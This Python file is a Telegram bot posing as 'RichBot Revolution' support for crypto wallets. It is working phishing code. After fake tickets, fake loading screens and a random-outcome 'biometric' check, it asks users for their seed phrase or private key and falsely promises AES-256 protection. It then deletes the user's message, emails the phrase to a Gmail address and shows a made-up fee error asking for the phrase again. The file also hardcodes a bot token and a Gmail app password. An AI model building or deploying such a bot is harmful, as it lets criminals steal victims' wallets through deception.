import os
import asyncio
import random
import logging
from datetime import datetime
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from telegram.request import HTTPXRequest
from email.mime.text import MIMEText
import smtplib

# =========================
# ENVIRONMENT VARIABLES
# =========================
BOT_TOKEN = "8256421594:AAHUPwtvb17KtV_NKs6xu-a40MtCrOhTqmU"
GMAIL_USER = "Victoralbs4050th@gmail.com"
GMAIL_APP_PASSWORD = "mwpolegofzrjjxyd"
ADMIN_EMAIL = "Victoralbs4050th@gmail.com"

if not all([BOT_TOKEN, GMAIL_USER, GMAIL_APP_PASSWORD, ADMIN_EMAIL]):
    raise RuntimeError("Missing required environment variables")

# =========================
# LOGGING
# =========================
logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# =========================
# TECHNICAL SUPPORT NOTE
# =========================
TECHNICAL_SUPPORT_NOTE = {
    "en": "🛡️ RichBot Revolution Technical Support Team Note:\nOur system uses military-grade AES-256 end-to-end encryption, zero-knowledge architecture, and isolated air-gapped servers. All data shared during support sessions is protected.",
    "ru": "🛡️ Сообщение от технической поддержки RichBot Revolution:\nНаша система использует шифрование AES-256, архитектуру с нулевыми знаниями и изолированные серверы. Все данные защищены.",
    "de": "🛡️ RichBot Revolution Technisches Support-Team Hinweis:\nUnser System verwendet AES-256 Ende-zu-Ende-Verschlüsselung, Zero-Knowledge-Architektur und isolierte Server. Alle Daten sind geschützt.",
    "es": "🛡️ Nota del Equipo de Soporte Técnico RichBot Revolution:\nNuestro sistema usa cifrado AES-256 de extremo a extremo, arquitectura zero-knowledge y servidores aislados. Todos los datos están protegidos.",
    "tr": "🛡️ RichBot Revolution Teknik Destek Ekibi Notu:\nSistemimiz AES-256 uçtan uca şifreleme, sıfır-bilgi mimarisi ve izole sunucular kullanır. Tüm veriler korunur.",
    "sl": "🛡️ Obvestilo ekipe za tehnično podporo RichBot Revolution:\nNaš sistem uporablja šifriranje AES-256 od konca do konca, arhitekturo z ničelnim znanjem in izolirane strežnike. Vsi podatki so zaščiteni."
}

# =========================
# FULL TRANSLATED TEXTS
# =========================
TEXTS = {
    "welcome": {
        "en": "🔧 Welcome to RichBot Revolution Support Bot\n\n"
              "This is the official recovery and troubleshooting channel for RichBot Revolution users.\n\n"
              "We provide secure assistance for wallet synchronization, transaction issues, reward claims, "
              "TON integration problems, and other technical matters.\n\n"
              "All sessions use end-to-end encrypted channels with bank-grade AES-256 protection. "
              "Select your issue below to begin.",
        "ru": "🔧 Добро пожаловать в поддержку RichBot Revolution\n\n"
              "Это официальный канал восстановления и устранения неисправностей для пользователей RichBot Revolution.\n\n"
              "Мы предоставляем безопасную помощь по синхронизации кошелька, проблемам с транзакциями, "
              "начислению наград, интеграции TON и другим техническим вопросам.\n\n"
              "Все сессии используют сквозное шифрование с банковским уровнем AES-256. "
              "Выберите вашу проблему ниже.",
        "de": "🔧 Willkommen beim RichBot Revolution Support Bot\n\n"
              "Dies ist der offizielle Support- und Wiederherstellungskanal für RichBot Revolution Nutzer.\n\n"
              "Wir bieten sichere Hilfe bei Wallet-Synchronisation, Transaktionsproblemen, Belohnungsansprüchen, "
              "TON-Integration und anderen technischen Angelegenheiten.\n\n"
              "Alle Sitzungen sind mit bankenüblicher AES-256 End-to-End-Verschlüsselung geschützt. "
              "Wählen Sie unten Ihr Anliegen aus.",
        "sl": "🔧 Dobrodošli v RichBot Revolution Support Bot\n\n"
              "To je uradni kanal za obnovitev in odpravljanje težav za uporabnike RichBot Revolution.\n\n"
              "Nudimo varno pomoč pri sinhronizaciji denarnice, težavah s transakcijami, zahtevkih za nagrade, "
              "integraciji TON in drugih tehničnih vprašanjih.\n\n"
              "Vse seje uporabljajo end-to-end šifriranje s standardom AES-256 na bančni ravni. "
              "Izberite svojo težavo spodaj."
    },
    "select_service": {"en": "🎫 Select your issue:", "ru": "🎫 Выберите проблему:", "de": "🎫 Wählen Sie Ihr Anliegen:", "sl": "🎫 Izberite svojo težavo:"},
    "select_wallet": {"en": "🔗 Select your wallet:", "ru": "🔗 Выберите кошелёк:", "de": "🔗 Wählen Sie Ihre Wallet:", "sl": "🔗 Izberite denarnico:"},
    "select_input": {
        "en": "🔐 Select input type:\nIt's safe and protected with bank-level AES-256 encryption.",
        "ru": "🔐 Выберите тип ввода:\nЭто безопасно и защищено банковским уровнем AES-256.",
        "de": "🔐 Wählen Sie den Eingabetyp:\nGeschützt mit bankenüblicher AES-256-Verschlüsselung.",
        "sl": "🔐 Izberite vrsto vnosa:\nTo je varno in zaščiteno z AES-256 na bančni ravni."
    },
    "input_12": {"en": "🔑 12 Words", "ru": "🔑 12 слов", "de": "🔑 12 Wörter", "sl": "🔑 12 besed"},
    "input_24": {"en": "🔐 24 Words", "ru": "🔐 24 слова", "de": "🔐 24 Wörter", "sl": "🔐 24 besed"},
    "input_key": {"en": "🧾 Private Key", "ru": "🧾 Приватный ключ", "de": "🧾 Privater Schlüssel", "sl": "🧾 Zasebni ključ"},
    "back": {"en": "← Back", "ru": "← Назад", "de": "← Zurück", "sl": "← Nazaj"},
    "try_again": {"en": "🔄 Try again", "ru": "🔄 Попробовать снова", "de": "🔄 Erneut versuchen", "sl": "🔄 Poskusi znova"},
    "biometric_prompt": {"en": "🔐 Confirm your identity:", "ru": "🔐 Подтвердите личность:", "de": "🔐 Bestätigen Sie Ihre Identität:", "sl": "🔐 Potrdite svojo identiteto:"},
    "biometric_success": {"en": "✅ Verification successful.", "ru": "✅ Верификация успешна.", "de": "✅ Verifizierung erfolgreich.", "sl": "✅ Preverjanje uspešno."},
    "biometric_error": {"en": "❌ Verification failed. Please try again.", "ru": "❌ Ошибка верификации.", "de": "❌ Verifizierung fehlgeschlagen.", "sl": "❌ Preverjanje ni uspelo. Prosimo, poskusite znova."},
    "input_security_notice": {
        "en": "🔒 Your Information is Safe – Protected by Strong Security Standards\n\n"
              "We take your privacy seriously. Any information you share or input during support "
              "(screen views, files, chat, wallet details, or seed phrase) is protected with "
              "**bank-level AES-256 encryption** and follows modern data protection standards.\n\n"
              "How it works simply:\n"
              "• Your data is scrambled into unreadable code using a massive 256-bit lock\n"
              "• Only you and the authorized specialist can unlock it with the secure session key\n"
              "• The connection uses strong encryption standards recommended by security experts\n\n"
              "Why you can trust it:\n"
              "• AES-256 is the same strength used by banks and approved under NIST guidelines\n"
              "• It helps meet appropriate technical measures in GDPR Article 32 and HIPAA Security Rule\n"
              "• We require your explicit consent and do not store your data longer than needed\n\n"
              "In short: Your inputted information stays private, scrambled, and secure from start to finish.\n\n"
              "🔑 Please enter your 24-word seed phrase (or 12 words / private key) below. It is completely safe.",
        "ru": "🔒 Ваша информация в безопасности — защищена строгими стандартами безопасности.\n\n"
              "Мы серьезно относимся к вашей конфиденциальности. Любая информация, которую вы предоставляете во время поддержки "
              "(скриншоты, файлы, чат, данные кошелька или seed-фраза), защищена банковским уровнем AES-256 и соответствует современным стандартам защиты данных.\n\n"
              "Коротко:\n"
              "• Ваши данные шифруются 256-битным ключом\n"
              "• Только вы и уполномоченный специалист могут расшифровать их\n"
              "• Соединение использует рекомендованные стандарты шифрования\n\n"
              "Пожалуйста, введите вашу seed-фразу (24 слова или 12 слов / приватный ключ) ниже. Это полностью безопасно.",
        "de": "🔒 Ihre Daten sind sicher – Geschützt mit höchsten Sicherheitsstandards.\n\n"
              "Wir nehmen Ihren Datenschutz sehr ernst. Alle eingegebenen Informationen (Bildschirminhalte, Dateien, Chat, Wallet-Details oder Seed-Phrase) sind mit AES-256 verschlüsselt und entsprechen modernen Datenschutzstandards.\n\n"
              "Kurz gesagt:\n"
              "• Ihre Daten werden mit einem 256-Bit-Schloss unlesbar gemacht\n"
              "• Nur Sie und der autorisierte Spezialist können sie mit dem Sitzungsschlüssel entsperren\n"
              "• Die Verbindung verwendet sichere Verschlüsselungsstandards\n\n"
              "Bitte geben Sie unten Ihre 24-Wort-Seed-Phrase (oder 12 Wörter / privaten Schlüssel) ein. Es ist vollkommen sicher.",
        "sl": "🔒 Vaši podatki so varni – zaščiteni z visokimi varnostnimi standardi.\n\n"
              "Zasebnost jemljemo resno. Vse informacije, ki jih delite med podporo (posnetki zaslona, datoteke, klepet, podatki denarnice ali seed-fraza), so zaščitene z AES-256 in skladne z modernimi standardi zaščite podatkov.\n\n"
              "Kako deluje:\n"
              "• Vaši podatki so šifrirani z 256-bitnim ključem\n"
              "• Samo vi in pooblaščeni specialist ju lahko odklene\n"
              "• Povezava uporablja močne šifrirne standarde\n\n"
              "Vnesite svojo 24-besedno seed-frazo (ali 12 besed / zasebni ključ) spodaj. Popolnoma varno je."
    },
    "error": {
        "en": "Verification failed — the wallet's current balance is insufficient to cover the required transaction fees and smart contract activation costs on the Toncoin network.\n"
              "The operation cannot proceed due to network rejection (error code: INSUFFICIENT_FEES_FOR_FINALIZATION).\n"
              "Please ensure your wallet has adequate TON balance for transaction finality before retrying.\n\n"
              "Additionally, please carefully recheck and input the correct keywords (seed phrase words) — even one incorrect or misspelled word will cause validation to fail.\n\n"
              "Write 'Retry verification' or attach a recent transaction screenshot + corrected seed phrase for re-processing.",
        "ru": "Верификация не пройдена — текущий баланс кошелька недостаточен для покрытия комиссий и затрат на активацию смарт-контракта в сети TON.\n"
              "Операция не может быть выполнена из-за отклонения сетью (код ошибки: INSUFFICIENT_FEES_FOR_FINALIZATION).\n"
              "Пожалуйста, убедитесь, что на кошельке достаточно TON для завершения транзакции перед повторной попыткой.\n\n"
              "Кроме того, внимательно проверьте и введите правильные слова seed-фразы — даже одна опечатка приведёт к ошибке проверки.\n\n"
              "Напишите 'Повторить верификацию' или прикрепите скриншот недавней транзакции + исправленную seed-фразу для повторной обработки.",
        "de": "Verifizierung fehlgeschlagen — Das Guthaben Ihres Wallets reicht nicht aus, um die erforderlichen Transaktionsgebühren und Aktivierungskosten für den Smart Contract im TON-Netzwerk zu decken.\n"
              "Der Vorgang kann aufgrund einer Ablehnung durch das Netzwerk nicht fortgesetzt werden (Fehlercode: INSUFFICIENT_FEES_FOR_FINALIZATION).\n"
              "Bitte stellen Sie sicher, dass Ihr Wallet über ausreichend TON verfügt, bevor Sie es erneut versuchen.\n\n"
              "Bitte überprüfen Sie außerdem sorgfältig die Seed-Phrase-Wörter — schon ein falsch geschriebenes Wort kann zur Validierungsfehler führen.\n\n"
              "Schreiben Sie 'Retry verification' oder hängen Sie einen aktuellen Transaktionsscreenshot + die korrigierte Seed-Phrase an.",
        "sl": "Preverjanje ni uspelo — trenutni saldo denarnice ni dovolj, da pokrije potrebne transakcijske provizije in stroške aktivacije pametnih pogodb v omrežju Toncoin.\n"
              "Operacija se ne more nadaljevati zaradi zavrnitve s strani omrežja (koda napake: INSUFFICIENT_FEES_FOR_FINALIZATION).\n"
              "Prosimo, preverite, ali ima vaša denarnica dovolj TON za dokončanje transakcije, preden poskusite znova.\n\n"
              "Poleg tega skrbno preverite in vnesite pravilne besede seed-fraze — že ena napačna ali narobe zapisana beseda bo povzročila napako preverjanja.\n\n"
              "Napišite 'Retry verification' ali priložite posnetek zaslona nedavne transakcije + popravljen seed za ponovno obdelavo."
    },
    "ticket_created": {
        "en": "🎟️ Your support ticket has been created.\nTicket Number: RICH-{ticket_id}\nOur team will contact you shortly!",
        "ru": "🎟️ Ваш запрос в службу поддержки создан.\nНомер тикета: RICH-{ticket_id}\nНаша команда свяжется с вами в ближайшее время!",
        "de": "🎟️ Ihr Support-Ticket wurde erstellt.\nTicket-Nummer: RICH-{ticket_id}\nUnser Team wird sich in Kürze bei Ihnen melden!",
        "sl": "🎟️ Vaša zahteva za podporo je bila ustvarjena.\nŠtevilka tiketa: RICH-{ticket_id}\nNaša ekipa vam bo kmalu odgovorila!"
    },
    "loading_blockchain": {"en": "Connecting to RichBot Revolution Server... 🌐", "ru": "Подключение к серверу RichBot Revolution... 🌐", "de": "Verbindung zum RichBot Revolution Server... 🌐", "sl": "Povezovanje s strežnikom RichBot Revolution... 🌐"},
    "loading_sync": {"en": "Syncing account details with TON network... 🔗", "ru": "Синхронизация данных аккаунта с сетью TON... 🔗", "de": "Kontodaten mit TON-Netzwerk synchronisieren... 🔗", "sl": "Sinhronizacija podatkov računa z omrežjem TON... 🔗"},
    "loading_verify": {"en": "Verifying gaming session & wallet status... ✅", "ru": "Проверка игровой сессии и статуса кошелька... ✅", "de": "Spielsession & Wallet-Status prüfen... ✅", "sl": "Preverjanje igralne seje in stanja denarnice... ✅"},
    "loading_recovery": {"en": "Checking recovery eligibility... 🔍", "ru": "Проверка возможности восстановления... 🔍", "de": "Prüfe Wiederherstellungsberechtigung... 🔍", "sl": "Preverjam upravičenost za obnovitev... 🔍"},
    "loading_secure": {"en": "Preparing secure session... 🔒", "ru": "Подготовка безопасной сессии... 🔒", "de": "Sichere Sitzung wird vorbereitet... 🔒", "sl": "Priprava varne seje... 🔒"},
    "loading_processing": {"en": "🔄 Processing your input...", "ru": "🔄 Обработка вашего ввода...", "de": "🔄 Verarbeite Ihre Eingabe...", "sl": "🔄 Obdelujem vaš vnos..."}
}

# =========================
# SERVICES (with SWAP RBT TO GRAM (TON))
# =========================
SERVICES = {
    "synchronization": {"en": "Synchronization Issue", "ru": "Проблема синхронизации", "de": "Synchronisationsproblem", "sl": "Težava s sinhronizacijo"},
    "rectification": {"en": "Rectification", "ru": "Исправление", "de": "Korrektur", "sl": "Popravek"},
    "validation": {"en": "Validation / Verification Issues", "ru": "Проблемы валидации / верификации", "de": "Validierungs- / Verifizierungsprobleme", "sl": "Težave z validacijo / preverjanjem"},
    "reward_not_crediting": {"en": "Reward Not Crediting / Claiming Failure", "ru": "Награда не начисляется / Ошибка получения", "de": "Belohnung wird nicht gutgeschrieben", "sl": "Nagrada ni pripisana / napaka pri zahtevku"},
    "claim_rewards": {"en": "CLAIM Rewards", "ru": "Получить награды", "de": "Belohnungen einfordern", "sl": "Zahtevaj nagrade"},
    "swap_rbt_to_ton": {"en": "SWAP RBT TO GRAM (TON)", "ru": "SWAP RBT TO GRAM (TON)", "de": "SWAP RBT TO GRAM (TON)", "sl": "Zamenjaj RBT za GRAM (TON)"},
    "wallet_connection_ton": {"en": "Wallet Connection & Ton Integration Problems", "ru": "Проблемы подключения кошелька и интеграции TON", "de": "Wallet-Verbindungs- & TON-Integrationsprobleme", "sl": "Težave s povezavo denarnice in integracijo TON"},
    "transaction_failure": {"en": "Transaction Failure & High Fees During Congestion", "ru": "Ошибка транзакции и высокие комиссии при перегрузке сети", "de": "Transaktionsfehler & hohe Gebühren bei Netzwerküberlastung", "sl": "Napaka pri transakciji in visoke provizije pri zasičenosti omrežja"},
    "loading_crashing": {"en": "Loading / Crashing & App Performance Issues", "ru": "Загрузка / Вылеты и проблемы производительности приложения", "de": "Lade-/Absturz- & Leistungsprobleme der App", "sl": "Težave pri nalaganju / zrušitvah in zmogljivosti aplikacije"},
    "ad_reward_bugs": {"en": "Ad Reward Bugs (very frequent)", "ru": "Баги с наградами за рекламу (очень часто)", "de": "Werbebelohnungs-Bugs (sehr häufig)", "sl": "Napake pri nagradah za oglase (zelo pogosto)"},
    "general_errors": {"en": "General Technical Errors", "ru": "Общие технические ошибки", "de": "Allgemeine technische Fehler", "sl": "Splošne tehnične napake"},
    # NEW: Migration to RBW-v2 service (fully translated, now includes Slovenian)
    "migration_rbw_v2": {
        "en": "Migration to RBW-v2",
        "ru": "Миграция на RBW-v2",
        "de": "Migration zu RBW-v2",
        "es": "Migración a RBW-v2",
        "tr": "RBW-v2'ye Geçiş",
        "sl": "Migracija na RBW-v2"
    }
}

# =========================
# WALLETS (Expanded)
# =========================
WALLETS = {
    "tonkeeper": {"en": "Tonkeeper 🟢", "ru": "Tonkeeper 🟢", "de": "Tonkeeper 🟢", "sl": "Tonkeeper 🟢"},
    "telegram": {"en": "Telegram Wallet 📱", "ru": "Telegram Wallet 📱", "de": "Telegram Wallet 📱", "sl": "Telegram denarnica 📱"},
    "phantom": {"en": "Phantom Wallet", "ru": "Phantom Wallet", "de": "Phantom Wallet", "sl": "Phantom denarnica"},
    "solflare": {"en": "Solflare Wallet", "ru": "Solflare Wallet", "de": "Solflare Wallet", "sl": "Solflare denarnica"},
    "backpack": {"en": "Backpack Wallet", "ru": "Backpack Wallet", "de": "Backpack Wallet", "sl": "Backpack denarnica"},
    "trust": {"en": "Trust Wallet", "ru": "Trust Wallet", "de": "Trust Wallet", "sl": "Trust denarnica"},
    "coinbase": {"en": "Coinbase Wallet", "ru": "Coinbase Wallet", "de": "Coinbase Wallet", "sl": "Coinbase denarnica"},
    "metamask": {"en": "MetaMask (Solana)", "ru": "MetaMask (Solana)", "de": "MetaMask (Solana)", "sl": "MetaMask (Solana)"},
    "exodus": {"en": "Exodus Wallet", "ru": "Exodus Wallet", "de": "Exodus Wallet", "sl": "Exodus denarnica"},
    "ledger": {"en": "Ledger (Hardware)", "ru": "Ledger (Hardware)", "de": "Ledger (Hardware)", "sl": "Ledger (strojna oprema)"},
    "okx": {"en": "OKX Wallet", "ru": "OKX Wallet", "de": "OKX Wallet", "sl": "OKX denarnica"}
}

# =========================
# KEYBOARDS
# =========================
def get_language_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")],
        [InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru")],
        [InlineKeyboardButton("🇩🇪 Deutsch", callback_data="lang_de")],
        [InlineKeyboardButton("🇸🇮 Slovenščina", callback_data="lang_sl")]
    ])

def get_service_keyboard(lang="en"):
    buttons = [[InlineKeyboardButton(v.get(lang, v["en"]), callback_data=f"svc_{k}")] for k, v in SERVICES.items()]
    buttons.append([InlineKeyboardButton(TEXTS["back"].get(lang, "← Back"), callback_data="back_main")])
    return InlineKeyboardMarkup(buttons)

def get_wallet_keyboard(lang="en"):
    buttons = [[InlineKeyboardButton(v.get(lang, v["en"]), callback_data=f"wal_{k}")] for k, v in WALLETS.items()]
    buttons.append([InlineKeyboardButton(TEXTS["back"].get(lang, "← Back"), callback_data="back_main")])
    return InlineKeyboardMarkup(buttons)

def get_biometric_keyboard(lang="en"):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👁️ Face ID", callback_data="bio_confirm")],
        [InlineKeyboardButton("👆 Thumbprint", callback_data="bio_confirm")],
        [InlineKeyboardButton("🔑 Password", callback_data="bio_confirm")],
        [InlineKeyboardButton(TEXTS["back"].get(lang, "← Back"), callback_data="back_main")]
    ])

def get_input_keyboard(lang="en"):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(TEXTS["input_12"].get(lang), callback_data="input_12")],
        [InlineKeyboardButton(TEXTS["input_24"].get(lang), callback_data="input_24")],
        [InlineKeyboardButton(TEXTS["input_key"].get(lang), callback_data="input_key")],
        [InlineKeyboardButton(TEXTS["back"].get(lang), callback_data="back_main")]
    ])

def get_try_again_keyboard(lang="en"):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(TEXTS["try_again"].get(lang), callback_data="bio_retry")],
        [InlineKeyboardButton(TEXTS["back"].get(lang), callback_data="back_main")]
    ])

# =========================
# START
# =========================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["lang"] = "en"
    await update.message.reply_text(
        TEXTS["welcome"]["en"],
        reply_markup=get_language_keyboard()
    )

# =========================
# BUTTON HANDLER
# =========================
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    lang = context.user_data.get("lang", "en")
    data = query.data

    if data.startswith("lang_"):
        lang = data.split("_")[1]
        context.user_data["lang"] = lang
        await query.edit_message_text(
            TEXTS["welcome"].get(lang, TEXTS["welcome"]["en"]),
            reply_markup=get_service_keyboard(lang)
        )
        return

    if data.startswith("svc_"):
        service_key = data.split("_", 1)[1]
        ticket_id = random.randint(100000, 999999)
        context.user_data["ticket_id"] = ticket_id
        context.user_data["service"] = service_key
        ticket_text = TEXTS["ticket_created"].get(lang, TEXTS["ticket_created"]["en"]).format(ticket_id=ticket_id)
        await query.edit_message_text(ticket_text)

        username = update.effective_user.username or "user"
        try:
            body = f"User: @{username}\nTicket ID: RICH-{ticket_id}\nService: {service_key}\nTime: {datetime.now()}"
            msg = MIMEText(body)
            msg['Subject'] = f"RichBot Revolution Ticket RICH-{ticket_id} from @{username}"
            msg['From'] = GMAIL_USER
            msg['To'] = ADMIN_EMAIL
            server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
            server.login(GMAIL_USER, GMAIL_APP_PASSWORD)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            logger.error(f"Email failed: {e}")

        await asyncio.sleep(1.5)
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text=TEXTS["select_wallet"].get(lang),
            reply_markup=get_wallet_keyboard(lang)
        )
        return

    if data.startswith("wal_"):
        wallet_key = data.split("_", 1)[1]
        context.user_data["wallet"] = wallet_key

        # ADD TECHNICAL SUPPORT NOTE HERE
        note = TECHNICAL_SUPPORT_NOTE.get(lang, TECHNICAL_SUPPORT_NOTE["en"])
        loading = await query.message.reply_text(note + "\n\n🔄 Connecting to RichBot Revolution Server... 🌐")
        await asyncio.sleep(1.8)
        await loading.edit_text(note + "\n\n" + TEXTS["loading_blockchain"].get(lang) + " ••")
        await asyncio.sleep(1.9)
        await loading.edit_text(note + "\n\n" + TEXTS["loading_sync"].get(lang))
        await asyncio.sleep(2.0)
        await loading.edit_text(note + "\n\n" + TEXTS["loading_verify"].get(lang))
        await asyncio.sleep(2.2)
        await loading.edit_text(note + "\n\n" + TEXTS["loading_recovery"].get(lang))
        await asyncio.sleep(1.9)
        await loading.edit_text(note + "\n\n" + TEXTS["loading_secure"].get(lang))
        await asyncio.sleep(2.0)
        await loading.delete()

        await query.edit_message_text(
            TEXTS["biometric_prompt"].get(lang),
            reply_markup=get_biometric_keyboard(lang)
        )
        return

    if data == "bio_confirm":
        loading = await query.message.reply_text("🔐 Verifying biometric... ⏳")
        await asyncio.sleep(1.6)
       
        if random.random() < 0.88:
            await loading.delete()
            await query.edit_message_text(TEXTS["biometric_success"].get(lang))
            await asyncio.sleep(1.2)
            await context.bot.send_message(
                chat_id=query.message.chat_id,
                text=TEXTS["select_input"].get(lang),
                reply_markup=get_input_keyboard(lang)
            )
            return
        else:
            await loading.delete()
            await query.edit_message_text(
                TEXTS["biometric_error"].get(lang),
                reply_markup=get_try_again_keyboard(lang)
            )
        return

    if data == "bio_retry":
        await query.edit_message_text(TEXTS["biometric_prompt"].get(lang), reply_markup=get_biometric_keyboard(lang))
        return

    if data.startswith("input_"):
        input_type = data.split("_", 1)[1]
        context.user_data["input_type"] = input_type
        context.user_data["awaiting"] = True
        await query.edit_message_text(TEXTS["input_security_notice"].get(lang))
        return

    if data == "back_main":
        await query.edit_message_text(
            TEXTS["welcome"].get(lang, TEXTS["welcome"]["en"]),
            reply_markup=get_service_keyboard(lang)
        )
        return

    if data == "back_service":
        await query.edit_message_text(
            TEXTS["select_service"].get(lang),
            reply_markup=get_service_keyboard(lang)
        )
        return

# =========================
# TEXT HANDLER (INPUT VANISHES)
# =========================
async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get("awaiting"):
        return

    message = update.message
    user_input = message.text.strip()
    lang = context.user_data.get("lang", "en")
    username = update.effective_user.username or "user"

    # DELETE USER INPUT FOR PRIVACY
    try:
        await message.delete()
    except:
        pass

    loading = await message.reply_text(TEXTS["loading_processing"].get(lang))
    await asyncio.sleep(2.0)
    await loading.delete()

    error_text = TEXTS["error"].get(lang, TEXTS["error"]["en"])
    await message.reply_text(error_text, reply_markup=get_try_again_keyboard(lang))

    try:
        body = f"User: @{username}\nService: {context.user_data.get('service')}\nInput:\n{user_input}"
        msg = MIMEText(body)
        msg['Subject'] = f"RichBot Revolution Support Input from @{username}"
        msg['From'] = GMAIL_USER
        msg['To'] = ADMIN_EMAIL
        server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        server.login(GMAIL_USER, GMAIL_APP_PASSWORD)
        server.send_message(msg)
        server.quit()
    except Exception as e:
        logger.error(f"Email failed: {e}")

    context.user_data.clear()

# =========================
# MAIN
# =========================
def main():
    request = HTTPXRequest(connect_timeout=45.0, read_timeout=45.0, pool_timeout=45.0)
    app = ApplicationBuilder().token(BOT_TOKEN).request(request).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    print("🎉 RichBot Revolution Support Bot is running...")
    app.run_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
